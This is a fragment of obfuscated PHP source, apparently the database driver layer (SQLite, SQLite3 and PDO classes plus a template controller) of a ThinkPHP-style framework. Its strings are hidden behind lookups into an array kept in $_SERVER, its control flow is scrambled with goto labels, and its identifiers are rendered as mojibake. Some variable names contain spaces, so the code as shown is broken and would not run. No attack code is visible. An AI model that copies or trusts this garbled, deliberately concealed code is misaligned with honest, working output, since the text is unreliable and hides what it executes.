CÖ°∞ÑÀ∑: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto EÕºåçÊÖÔ; e–ø°ﬂŸ˘Ω: $this->in =& $in; $this->values[$D´áÎµ¢√˘[6]] =& $config; $this->values[$D´áÎµ¢√˘[7]] =& $in; goto f¿ﬁñäøΩ∫; EÕºåçÊÖÔ: $D´áÎµ¢√˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; global $in, $config; $this->config =& $config; goto e–ø°ﬂŸ˘Ω; f¿ﬁñäøΩ∫: $this->tpl = TEMPLATE . MOD . $D´áÎµ¢√˘[8]; $this->_classObjectID = mt_rand(0, 10000); goto fåæ±◊¨®æ; fåæ±◊¨®æ: } public function loadClass($aèÛ‚ÉÚ©≥) { if (1 === func_num_args()) { $this->{$aèÛ‚ÉÚ©≥} = new $aèÛ‚ÉÚ©≥(); } else { $A´üô£≥ÎÔ = new ReflectionClass($aèÛ‚ÉÚ©≥); $DıåﬂÚΩıâ = func_get_args(); array_shift($DıåﬂÚΩıâ); $this->{$aèÛ‚ÉÚ©≥} = $A´üô£≥ÎÔ->newInstanceArgs($DıåﬂÚΩıâ); } return $this->{$aèÛ‚ÉÚ©≥}; } protected function assign($AåœÏﬁÆê», $f´ÑìÇÇ¯…) { $this->values[$AåœÏﬁÆê»] = $f´ÑìÇÇ¯…; } protected function display($f‰ÌÖê§¥õ) { ob_end_clean(); extract($this->values); require $this->tpl . $f‰ÌÖê§¥õ; } } class DbSqliteBase extends Db { public function __construct($cÿµâ∏ôìê = '') { $eﬁıºŒÒÆﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!extension_loaded($eﬁıºŒÒÆﬁ[9])) { think_exception(think_lang($eﬁıºŒÒÆﬁ[10]) . $eﬁıºŒÒÆﬁ[11]); } if (!empty($cÿµâ∏ôìê)) { if (!isset($cÿµâ∏ôìê[$eﬁıºŒÒÆﬁ[12]])) { $cÿµâ∏ôìê[$eﬁıºŒÒÆﬁ[12]] = 438; } $this->config = $cÿµâ∏ôìê; if (empty($this->config[$eﬁıºŒÒÆﬁ[13]])) { $this->config[$eﬁıºŒÒÆﬁ[13]] = array(); } } } public function connect($d∆›ÇÀ∑∑∆ = '', $aá∫÷€œÔÚ = 0) { $aÏ€Õ˘€ç› =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($this->linkID[$aá∫÷€œÔÚ])) { goto E®°ÎŸ≤œ´; DÆç£Ø◊õÖ: @sqlite_busy_timeout($this->linkID[$aá∫÷€œÔÚ], 30000); if (1 != think_config($aÏ€Õ˘€ç›[18])) { unset($this->config); } goto dﬂ’◊áÓãå; E®°ÎŸ≤œ´: if (empty($d∆›ÇÀ∑∑∆)) { $d∆›ÇÀ∑∑∆ = $this->config; } $bô˘—”ñì = !empty($d∆›ÇÀ∑∑∆[$aÏ€Õ˘€ç›[13]][$aÏ€Õ˘€ç›[14]]) ? $d∆›ÇÀ∑∑∆[$aÏ€Õ˘€ç›[13]][$aÏ€Õ˘€ç›[14]] : $this->pconnect; $e˘øìÙò„ó = $bô˘—”ñì ? $aÏ€Õ˘€ç›[15] : $aÏ€Õ˘€ç›[16]; goto a∆ùäÖ–ÛÇ; a∆ùäÖ–ÛÇ: $this->linkID[$aá∫÷€œÔÚ] = $e˘øìÙò„ó($d∆›ÇÀ∑∑∆[$aÏ€Õ˘€ç›[17]], $d∆›ÇÀ∑∑∆[$aÏ€Õ˘€ç›[12]]); if (!$this->linkID[$aá∫÷€œÔÚ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto DÆç£Ø◊õÖ; dﬂ’◊áÓãå: } return $this->linkID[$aá∫÷€œÔÚ]; } public function free() { $this->queryID = null; } public function query($dñè’á≤∑´) { goto dö‘Ôàﬁ¥ˆ; Bç≥≠Ñéí¶: $this->queryStr = $dñè’á≤∑´; if ($this->queryID) { $this->free(); } think_action_status($a¡ÈÎú†·¨[19], 1); goto FíË‰®Ñ›ù; FíË‰®Ñ›ù: think_status($a¡ÈÎú†·¨[20]); $this->queryID = sqlite_query($this->_linkID, $dñè’á≤∑´); $this->debug(); goto d∫ØñØ›ÇØ; d∫ØñØ›ÇØ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $EÙ®ºµœ™Ç = $this->getAll(); return $EÙ®ºµœ™Ç; } goto Fı¶’â·âï; dö‘Ôàﬁ¥ˆ: $a¡ÈÎú†·¨ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Bç≥≠Ñéí¶; Fı¶’â·âï: } public function execute($Bƒ»åñÚ·√) { goto CÀŸáÆµœÑ; c√‹¢ô€≤€: think_status($CÓ¨»†∞⁄™[20]); $bƒû§‘»ûè = sqlite_exec($this->_linkID, $Bƒ»åñÚ·√); $this->debug(); goto FΩ÷ë†ÓÉâ; C–áî„∫ê⁄: $this->queryStr = $Bƒ»åñÚ·√; if ($this->queryID) { $this->free(); } think_action_status($CÓ¨»†∞⁄™[21], 1); goto c√‹¢ô€≤€; CÀŸáÆµœÑ: $CÓ¨»†∞⁄™ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C–áî„∫ê⁄; FΩ÷ë†ÓÉâ: if (!1 === $bƒû§‘»ûè) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto EÖ£π‡◊¡≤; EÖ£π‡◊¡≤: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[£¿ÌÙëü¡¯¯][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EÜ’Ω‡‰¯œ = sqlite_query($this->_linkID, $_SERVER[£¿ÌÙëü¡¯¯][23]); if (!$EÜ’Ω‡‰¯œ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $B∏‘‘åÓˆÛ = sqlite_query($this->_linkID, $_SERVER[£¿ÌÙëü¡¯¯][24]); if (!$B∏‘‘åÓˆÛ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F§ﬁÇŸÃ‰º = array(); if ($this->numRows > 0) { for ($aÃÌ™ë£ïá = 0; $aÃÌ™ë£ïá < $this->numRows; $aÃÌ™ë£ïá++) { $F§ﬁÇŸÃ‰º[$aÃÌ™ë£ïá] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $F§ﬁÇŸÃ‰º; } public function getFields($C†¢èÏÌêó) { $aôß¥ÑÀøÏ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e ¨ëÊÔÙ√ = $this->query($aôß¥ÑÀøÏ[25] . $C†¢èÏÌêó . $aôß¥ÑÀøÏ[26]); $b’ñ¬£äﬁÖ = array(); if ($e ¨ëÊÔÙ√) { foreach ($e ¨ëÊÔÙ√ as $F‰‚âºáƒ√ => $c∫«∑”¨è) { $b’ñ¬£äﬁÖ[$c∫«∑”¨è[$aôß¥ÑÀøÏ[27]]] = array($aôß¥ÑÀøÏ[28] => $c∫«∑”¨è[$aôß¥ÑÀøÏ[27]], $aôß¥ÑÀøÏ[29] => $c∫«∑”¨è[$aôß¥ÑÀøÏ[30]], $aôß¥ÑÀøÏ[31] => (bool) ($c∫«∑”¨è[$aôß¥ÑÀøÏ[32]] === $aôß¥ÑÀøÏ[33]), $aôß¥ÑÀøÏ[34] => $c∫«∑”¨è[$aôß¥ÑÀøÏ[35]], $aôß¥ÑÀøÏ[36] => strtolower($c∫«∑”¨è[$aôß¥ÑÀøÏ[37]]) == $aôß¥ÑÀøÏ[38], $aôß¥ÑÀøÏ[39] => strtolower($c∫«∑”¨è[$aôß¥ÑÀøÏ[40]]) == $aôß¥ÑÀøÏ[41]); } } return $b’ñ¬£äﬁÖ; } public function getTables($F†Œèª¯°¨ = '') { $d‡òœ⁄„∆ò =& $_SERVER[£¿ÌÙëü¡¯¯]; $A·Ç±êŸ¿£ = $this->query($d‡òœ⁄„∆ò[42] . $d‡òœ⁄„∆ò[43] . $d‡òœ⁄„∆ò[44]); $cá˜¬Üé≤≠ = array(); foreach ($A·Ç±êŸ¿£ as $A¥ëà§∂éÚ => $f™¬µ—â˜œ) { $cá˜¬Üé≤≠[$A¥ëà§∂éÚ] = current($f™¬µ—â˜œ); } return $cá˜¬Üé≤≠; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $eè•≤≠…Œè =& $_SERVER[£¿ÌÙëü¡¯¯]; $D◊∞û§Õ◊„ = sqlite_last_error($this->_linkID); $this->error = $D◊∞û§Õ◊„ . $eè•≤≠…Œè[4] . sqlite_error_string($D◊∞û§Õ◊„); if ($eè•≤≠…Œè[33] != $this->queryStr) { $this->error .= LNG($eè•≤≠…Œè[45]) . $this->queryStr; } think_trace($this->error, $eè•≤≠…Œè[33], $eè•≤≠…Œè[46]); return $this->error; } public function escapeString($e—∏çá¥óÌ) { return sqlite_escape_string($e—∏çá¥óÌ); } public function parseLimit($BÎ∂Ï¥“Îä) { $FÊ£®°Ò‰ú =& $_SERVER[£¿ÌÙëü¡¯¯]; $d·–˜’‘Ú˜ = $FÊ£®°Ò‰ú[33]; if (!empty($BÎ∂Ï¥“Îä)) { $BÎ∂Ï¥“Îä = explode($FÊ£®°Ò‰ú[47], $BÎ∂Ï¥“Îä); if (count($BÎ∂Ï¥“Îä) > 1) { $d·–˜’‘Ú˜ .= $FÊ£®°Ò‰ú[48] . $BÎ∂Ï¥“Îä[1] . $FÊ£®°Ò‰ú[49] . $BÎ∂Ï¥“Îä[0] . $FÊ£®°Ò‰ú[50]; } else { $d·–˜’‘Ú˜ .= $FÊ£®°Ò‰ú[48] . $BÎ∂Ï¥“Îä[0] . $FÊ£®°Ò‰ú[50]; } } return $d·–˜’‘Ú˜; } } class DbSqlite3Base extends Db { public function __construct($E‘Ò¢É±üÙ = '') { $Fú¥ØŒûÚë =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!class_exists($Fú¥ØŒûÚë[51])) { think_exception(think_lang($Fú¥ØŒûÚë[10]) . $Fú¥ØŒûÚë[52]); } if (!empty($E‘Ò¢É±üÙ)) { if (!isset($E‘Ò¢É±üÙ[$Fú¥ØŒûÚë[12]])) { $E‘Ò¢É±üÙ[$Fú¥ØŒûÚë[12]] = 438; } $this->config = $E‘Ò¢É±üÙ; if (empty($this->config[$Fú¥ØŒûÚë[13]])) { $this->config[$Fú¥ØŒûÚë[13]] = array(); } } } public function connect($Aœ´Öñ±øÒ = '', $EÖ⁄˜á∂áñ = 0) { $B†Ö±Ü◊ﬁ∆ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($this->linkID[$EÖ⁄˜á∂áñ])) { if (empty($Aœ´Öñ±øÒ)) { $Aœ´Öñ±øÒ = $this->config; } $this->linkID[$EÖ⁄˜á∂áñ] = new SQLite3($Aœ´Öñ±øÒ[$B†Ö±Ü◊ﬁ∆[17]]); if (!$this->linkID[$EÖ⁄˜á∂áñ]) { think_exception($this->linkID[$EÖ⁄˜á∂áñ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$EÖ⁄˜á∂áñ]->busyTimeout(30000); if (1 != think_config($B†Ö±Ü◊ﬁ∆[18])) { unset($this->config); } } return $this->linkID[$EÖ⁄˜á∂áñ]; } public function free() { $this->queryID = null; } public function query($d··Úò—∞Ø) { goto C§Èä–ﬂè±; C§Èä–ﬂè±: $e·íããˆö÷ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÓõﬁﬂ≥Ì´; a∂Âà¶â∏Ñ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $e˜ì¢—‰äí = $this->getAll(); $this->numRows = count($e˜ì¢—‰äí); return $e˜ì¢—‰äí; } goto fπ√∫ˆêûò; e£À‰ˆ“⁄’: think_status($e·íããˆö÷[20]); $this->queryID = $this->_linkID->query($d··Úò—∞Ø); $this->debug(); goto a∂Âà¶â∏Ñ; CÓõﬁﬂ≥Ì´: $this->queryStr = $d··Úò—∞Ø; if ($this->queryID) { $this->free(); } think_action_status($e·íããˆö÷[19], 1); goto e£À‰ˆ“⁄’; fπ√∫ˆêûò: } public function execute($dÜ™Œ÷›àæ) { goto dÍÁûîö≥…; FÎ®Œï†«∆: $this->queryStr = $dÜ™Œ÷›àæ; if ($this->queryID) { $this->free(); } think_action_status($eÉ∫”ÏåÜ≤[21], 1); goto a‹í¬„–«¨; E†ˆ›„ãÓÛ: if (!1 === $b·Ü¶¥úìÈ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto fÉπµΩåÿƒ; a‹í¬„–«¨: think_status($eÉ∫”ÏåÜ≤[20]); $b·Ü¶¥úìÈ = $this->_linkID->exec($dÜ™Œ÷›àæ); $this->debug(); goto E†ˆ›„ãÓÛ; dÍÁûîö≥…: $eÉ∫”ÏåÜ≤ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FÎ®Œï†«∆; fÉπµΩåÿƒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[£¿ÌÙëü¡¯¯][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B∆¯À‚ò‡ä = $this->_linkID->query($_SERVER[£¿ÌÙëü¡¯¯][23]); if (!$B∆¯À‚ò‡ä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dùë◊Üøø´ = $this->_linkID->query($_SERVER[£¿ÌÙëü¡¯¯][24]); if (!$dùë◊Üøø´) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BÏî™óñá– = array(); while ($EÌéï¿≥åç = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $BÏî™óñá–[] = $EÌéï¿≥åç; } $this->queryID->reset(); return $BÏî™óñá–; } public function getFields($f·Ë ì∂Ñ—) { $bØÉÁÆƒÎ§ =& $_SERVER[£¿ÌÙëü¡¯¯]; $EÚ≤÷œÀΩ· = $this->query($bØÉÁÆƒÎ§[25] . $f·Ë ì∂Ñ— . $bØÉÁÆƒÎ§[26]); $bπÙ«óÕ≥√ = array(); if ($EÚ≤÷œÀΩ·) { foreach ($EÚ≤÷œÀΩ· as $E©∫Ω≠Ç˘ø => $b˘ÊÀ—ØÛ´) { $bπÙ«óÕ≥√[$b˘ÊÀ—ØÛ´[$bØÉÁÆƒÎ§[28]]] = array($bØÉÁÆƒÎ§[28] => $b˘ÊÀ—ØÛ´[$bØÉÁÆƒÎ§[28]], $bØÉÁÆƒÎ§[29] => $b˘ÊÀ—ØÛ´[$bØÉÁÆƒÎ§[29]], $bØÉÁÆƒÎ§[31] => (bool) ($b˘ÊÀ—ØÛ´[$bØÉÁÆƒÎ§[31]] === $bØÉÁÆƒÎ§[33]), $bØÉÁÆƒÎ§[34] => $b˘ÊÀ—ØÛ´[$bØÉÁÆƒÎ§[53]], $bØÉÁÆƒÎ§[36] => (bool) $b˘ÊÀ—ØÛ´[$bØÉÁÆƒÎ§[54]], $bØÉÁÆƒÎ§[39] => (bool) $b˘ÊÀ—ØÛ´[$bØÉÁÆƒÎ§[54]]); } } return $bπÙ«óÕ≥√; } public function getTables($e◊ µå∆ÉÛ = '') { $d©ÀµÆäÎÒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aèÚ £ÎΩœ = $this->query($d©ÀµÆäÎÒ[42] . $d©ÀµÆäÎÒ[43] . $d©ÀµÆäÎÒ[44]); $c√Ç ÙŒëﬁ = array(); foreach ($aèÚ £ÎΩœ as $Eøä†µ¬◊Ü => $c˘‡≈ûõ—Ú) { $c√Ç ÙŒëﬁ[$Eøä†µ¬◊Ü] = current($c˘‡≈ûõ—Ú); } return $c√Ç ÙŒëﬁ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bõï¿À• ¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->error = $this->_linkID->lastErrorMsg(); if ($bõï¿À• ¿[33] != $this->queryStr) { $this->error .= LNG($bõï¿À• ¿[45]) . $this->queryStr; } think_trace($this->error, $bõï¿À• ¿[33], $bõï¿À• ¿[46]); return $this->error; } public function escapeString($f ¯ãÕ‡´á) { $d∫ΩäÔ©â =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($this->_linkID) { return $this->_linkID->escapeString($f ¯ãÕ‡´á); } return str_ireplace($d∫ΩäÔ©â[55], $d∫ΩäÔ©â[56], $f ¯ãÕ‡´á); } public function parseLimit($bÜÏƒõÛÎù) { $bøí◊ﬂÖ”è =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÛ—Óíö‘‚ = $bøí◊ﬂÖ”è[33]; if (!empty($bÜÏƒõÛÎù)) { $bÜÏƒõÛÎù = explode($bøí◊ﬂÖ”è[47], $bÜÏƒõÛÎù); if (count($bÜÏƒõÛÎù) > 1) { $DÛ—Óíö‘‚ .= $bøí◊ﬂÖ”è[48] . $bÜÏƒõÛÎù[1] . $bøí◊ﬂÖ”è[49] . $bÜÏƒõÛÎù[0] . $bøí◊ﬂÖ”è[50]; } else { $DÛ—Óíö‘‚ .= $bøí◊ﬂÖ”è[48] . $bÜÏƒõÛÎù[0] . $bøí◊ﬂÖ”è[50]; } } return $DÛ—Óíö‘‚; } } goto a∏àóÛ÷˘†; dƒ—ç»’∞∆: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($E“±Ö˜Ô”Ω = '') { $c≠•¢±Œ‡« =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!class_exists($c≠•¢±Œ‡«[824])) { think_exception(think_lang($c≠•¢±Œ‡«[10]) . $c≠•¢±Œ‡«[825]); } if (!empty($E“±Ö˜Ô”Ω)) { $this->config = $E“±Ö˜Ô”Ω; if (empty($this->config[$c≠•¢±Œ‡«[13]])) { $this->config[$c≠•¢±Œ‡«[13]] = array(); } } } public function connect($DÊ…Ì∫êË› = '', $bπí⁄ïÇƒó = 0) { $aâÛæî√åã =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!isset($this->linkID[$bπí⁄ïÇƒó])) { goto C±Ó÷‰È“ô; fàäåªã˘ı: $this->dbType = $this->_getDsnType($DÊ…Ì∫êË›[$aâÛæî√åã[826]]); if (in_array($this->dbType, array($aâÛæî√åã[827], $aâÛæî√åã[828], $aâÛæî√åã[829], $aâÛæî√åã[830]))) { think_exception($aâÛæî√åã[831] . $this->dbType . $aâÛæî√åã[832] . $this->dbType . $aâÛæî√åã[833]); } if (!$this->linkID[$bπí⁄ïÇƒó]) { think_exception($aâÛæî√åã[834]); } goto eŒﬁ„‰õì·; C±Ó÷‰È“ô: if (empty($DÊ…Ì∫êË›)) { $DÊ…Ì∫êË› = $this->config; } if ($this->pconnect) { $DÊ…Ì∫êË›[$aâÛæî√åã[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$bπí⁄ïÇƒó] = new PDO($DÊ…Ì∫êË›[$aâÛæî√åã[826]], $DÊ…Ì∫êË›[$aâÛæî√åã[798]], $DÊ…Ì∫êË›[$aâÛæî√åã[799]], $DÊ…Ì∫êË›[$aâÛæî√åã[13]]); } catch (PDOException $fÑÏ∂‰≠Âˆ) { think_exception($fÑÏ∂‰≠Âˆ->getMessage()); } goto fàäåªã˘ı; eŒﬁ„‰õì·: $this->linkID[$bπí⁄ïÇƒó]->exec($aâÛæî√åã[835] . think_config($aâÛæî√åã[801])); $this->connected = !0; if (1 != think_config($aâÛæî√åã[18])) { unset($this->config); } goto a≠≈“€ŒÜÍ; a≠≈“€ŒÜÍ: } return $this->linkID[$bπí⁄ïÇƒó]; } public function free() { $this->PDOStatement = null; } public function query($CÇ¡®éØ·Ó, $FÏ‘Éçùïﬁ = array()) { goto aë çßˆÇì; B™Æ¢å∞∫É: if (!1 === $cóÖŸØ∏…∂) { $this->error(); return !1; } else { return $this->getAll(); } goto cÃ€ËçÜÀÚ; aë çßˆÇì: $dﬂÿŒ¯ﬂóò =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cúÍπ”ëÌè; b¿ùõîÎú⁄: think_action_status($dﬂÿŒ¯ﬂóò[19], 1); think_status($dﬂÿŒ¯ﬂóò[20]); $this->PDOStatement = $this->_linkID->prepare($CÇ¡®éØ·Ó); goto eÖ«…¯£‚å; cúÍπ”ëÌè: $this->queryStr = $CÇ¡®éØ·Ó; if (!empty($FÏ‘Éçùïﬁ)) { $this->queryStr .= $dﬂÿŒ¯ﬂóò[836] . print_r($FÏ‘Éçùïﬁ, !0) . $dﬂÿŒ¯ﬂóò[837]; } if (!empty($this->PDOStatement)) { $this->free(); } goto b¿ùõîÎú⁄; eÖ«…¯£‚å: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $cóÖŸØ∏…∂ = $this->PDOStatement->execute($FÏ‘Éçùïﬁ); $this->debug(); goto B™Æ¢å∞∫É; cÃ€ËçÜÀÚ: } public function execute($a‘Û∏ªí≈á, $aâœÇÑÂ£¡ = array()) { goto b≤©â®Ã∏À; A√ÓäÖ∞±Ó: think_status($Côà˜∫£õÂ[20]); $this->PDOStatement = $this->_linkID->prepare($a‘Û∏ªí≈á); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto e˜äÂÉá«”; f∏±∫ï—Õ‹: if ($this->dbType == $Côà˜∫£õÂ[830]) { if (preg_match($Côà˜∫£õÂ[838], $this->queryStr, $C≈±çß„√·)) { $this->table = think_config($Côà˜∫£õÂ[839]) . str_ireplace(think_config($Côà˜∫£õÂ[840]), $Côà˜∫£õÂ[358], $C≈±çß„√·[2]); $Dªˆ∞‹Ô‡¿ = (bool) $this->query($Côà˜∫£õÂ[841] . strtoupper($this->table) . $Côà˜∫£õÂ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Côà˜∫£õÂ[21], 1); goto A√ÓäÖ∞±Ó; e˜äÂÉá«”: $Bü¡ñº—˘í = $this->PDOStatement->execute($aâœÇÑÂ£¡); $this->debug(); if (!1 === $Bü¡ñº—˘í) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Dªˆ∞‹Ô‡¿ || preg_match($Côà˜∫£õÂ[842], $a‘Û∏ªí≈á)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto F•Œ∏îÙ´«; b≤©â®Ã∏À: $Côà˜∫£õÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F„≤å¥Öò—; F„≤å¥Öò—: $this->queryStr = $a‘Û∏ªí≈á; if (!empty($aâœÇÑÂ£¡)) { $this->queryStr .= $Côà˜∫£õÂ[836] . print_r($aâœÇÑÂ£¡, !0) . $Côà˜∫£õÂ[837]; } $Dªˆ∞‹Ô‡¿ = !1; goto f∏±∫ï—Õ‹; F•Œ∏îÙ´«: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bö√≈Ù∑°… = $this->_linkID->commit(); $this->transTimes = 0; if (!$Bö√≈Ù∑°…) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cü±÷ÍÌÑÛ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Cü±÷ÍÌÑÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $BÁâŸ™≈ﬁÔ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($BÁâŸ™≈ﬁÔ); return $BÁâŸ™≈ﬁÔ; } public function getFields($D–ôâéæıü) { goto Båö∫Ó÷à‚; Båö∫Ó÷à‚: $dˆâØºå“≤ =& $_SERVER[£¿ÌÙëü¡¯¯]; $this->initConnect(!0); if (think_config($dˆâØºå“≤[843])) { $F®∑µ¿åóé = str_replace($dˆâØºå“≤[844], $D–ôâéæıü, think_config($dˆâØºå“≤[843])); } else { switch ($this->dbType) { case $dˆâØºå“≤[827]: case $dˆâØºå“≤[845]: $F®∑µ¿åóé = "\123\105\x4c\105\x43\x54\x20\x20\x20\x63\157\154\165\155\156\137\x6e\141\x6d\x65\40\141\x73\x20\47\116\141\155\x65\x27\54\40\x20\40\x64\141\x74\x61\x5f\164\x79\160\x65\x20\x61\x73\x20\47\124\171\160\145\x27\x2c\40\x20\40\x63\157\x6c\165\155\x6e\x5f\x64\145\146\x61\x75\x6c\x74\x20\x61\x73\40\x27\104\x65\x66\141\165\154\x74\x27\54\40\40\40\151\163\x5f\x6e\165\x6c\154\141\142\x6c\x65\40\141\x73\x20\x27\x4e\165\154\154\47\12\x9\11\106\122\x4f\115\x9\151\156\x66\x6f\162\x6d\141\164\151\157\156\137\x73\x63\x68\145\155\141\56\164\141\x62\154\x65\x73\40\x41\x53\40\x74\xa\11\x9\112\117\x49\116\x9\x69\156\146\x6f\162\x6d\x61\164\x69\157\156\137\x73\143\150\145\x6d\141\56\x63\x6f\154\165\155\156\163\x20\101\123\40\x63\xa\x9\11\117\116\40\x20\x74\56\x74\x61\x62\154\x65\137\143\141\164\x61\x6c\x6f\147\x20\x3d\40\x63\x2e\164\x61\142\x6c\x65\x5f\x63\x61\x74\141\154\157\147\12\x9\x9\x41\x4e\x44\x20\x74\x2e\164\x61\142\x6c\x65\x5f\163\x63\x68\145\155\141\x20\75\x20\143\56\164\141\x62\x6c\145\137\163\143\x68\145\x6d\141\xa\11\11\101\x4e\x44\x20\164\x2e\x74\141\x62\154\x65\x5f\x6e\x61\x6d\145\x20\75\40\x63\x2e\x74\141\x62\x6c\145\x5f\x6e\141\x6d\145\12\11\11\127\110\x45\122\x45\40\x20\x20\164\x2e\x74\x61\x62\x6c\145\x5f\156\x61\155\145\40\x3d\40\47{$D–ôâéæıü}\47"; break; case $dˆâØºå“≤[846]: $F®∑µ¿åóé = $dˆâØºå“≤[847] . $D–ôâéæıü . $dˆâØºå“≤[848]; break; case $dˆâØºå“≤[828]: case $dˆâØºå“≤[830]: $F®∑µ¿åóé = $dˆâØºå“≤[849] . $dˆâØºå“≤[850] . $dˆâØºå“≤[851] . strtoupper($D–ôâéæıü) . $dˆâØºå“≤[852] . strtoupper($D–ôâéæıü) . $dˆâØºå“≤[853]; break; case $dˆâØºå“≤[854]: $F®∑µ¿åóé = $dˆâØºå“≤[855] . $D–ôâéæıü . $dˆâØºå“≤[856]; break; case $dˆâØºå“≤[829]: break; case $dˆâØºå“≤[857]: default: $F®∑µ¿åóé = $dˆâØºå“≤[858] . ($this->dbType == $dˆâØºå“≤[857] ? "\x60{$D–ôâéæıü}\140" : $D–ôâéæıü); } } goto B”¬¬Ôé√π; füàŒ∏ç£◊: return $c‹èÚÜ“¨ı; goto a∂ú„…¶ç»; B”¬¬Ôé√π: $C–≤›–öª’ = $this->query($F®∑µ¿åóé); $c‹èÚÜ“¨ı = array(); if ($C–≤›–öª’) { foreach ($C–≤›–öª’ as $f—ßêÁËÚã => $b≈»áã∏≤») { $b≈»áã∏≤» = array_change_key_case($b≈»áã∏≤»); $b≈»áã∏≤»[$dˆâØºå“≤[28]] = isset($b≈»áã∏≤»[$dˆâØºå“≤[28]]) ? $b≈»áã∏≤»[$dˆâØºå“≤[28]] : $dˆâØºå“≤[358]; $b≈»áã∏≤»[$dˆâØºå“≤[29]] = isset($b≈»áã∏≤»[$dˆâØºå“≤[29]]) ? $b≈»áã∏≤»[$dˆâØºå“≤[29]] : $dˆâØºå“≤[358]; $D¬ÆÒ¥ÙÜ∑ = isset($b≈»áã∏≤»[$dˆâØºå“≤[258]]) ? $b≈»áã∏≤»[$dˆâØºå“≤[258]] : $b≈»áã∏≤»[$dˆâØºå“≤[28]]; $c‹èÚÜ“¨ı[$D¬ÆÒ¥ÙÜ∑] = array($dˆâØºå“≤[28] => $D¬ÆÒ¥ÙÜ∑, $dˆâØºå“≤[29] => $b≈»áã∏≤»[$dˆâØºå“≤[29]], $dˆâØºå“≤[31] => (bool) (isset($b≈»áã∏≤»[$dˆâØºå“≤[102]]) && $b≈»áã∏≤»[$dˆâØºå“≤[102]] === $dˆâØºå“≤[33] || isset($b≈»áã∏≤»[$dˆâØºå“≤[31]]) && $b≈»áã∏≤»[$dˆâØºå“≤[31]] === $dˆâØºå“≤[33]), $dˆâØºå“≤[34] => isset($b≈»áã∏≤»[$dˆâØºå“≤[34]]) ? $b≈»áã∏≤»[$dˆâØºå“≤[34]] : (isset($b≈»áã∏≤»[$dˆâØºå“≤[53]]) ? $b≈»áã∏≤»[$dˆâØºå“≤[53]] : $dˆâØºå“≤[358]), $dˆâØºå“≤[36] => isset($b≈»áã∏≤»[$dˆâØºå“≤[90]]) ? strtolower($b≈»áã∏≤»[$dˆâØºå“≤[90]]) == $dˆâØºå“≤[38] : (isset($b≈»áã∏≤»[$dˆâØºå“≤[54]]) ? $b≈»áã∏≤»[$dˆâØºå“≤[54]] : !1), $dˆâØºå“≤[39] => isset($b≈»áã∏≤»[$dˆâØºå“≤[859]]) ? strtolower($b≈»áã∏≤»[$dˆâØºå“≤[859]]) == $dˆâØºå“≤[41] : (isset($b≈»áã∏≤»[$dˆâØºå“≤[90]]) ? $b≈»áã∏≤»[$dˆâØºå“≤[90]] : !1)); } } goto füàŒ∏ç£◊; 